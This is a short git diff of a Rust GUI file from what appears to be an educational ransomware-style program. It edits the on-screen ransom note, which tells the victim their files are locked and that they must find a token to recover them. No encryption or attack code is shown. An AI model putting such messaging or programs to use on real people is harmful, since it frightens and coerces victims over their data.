@@ -25,8 +25,9 @@ pub mod app {
             That means you can no longer access them for the moment.
             You can go ahead and check your documents files for instance.
             Luckily for you this time, I am a friendly program.
-            To recover your data, go to the following website.
-            You will learn a bit about the dangers of opening suspicious files.
+            To recover your data, you must find out your token.
+            I hope you will learn about the dangers of opening suspicious files
+            during your search.
             Beware that the next time you might not get as lucky."#;
 
         let header = Label::new(long_text)
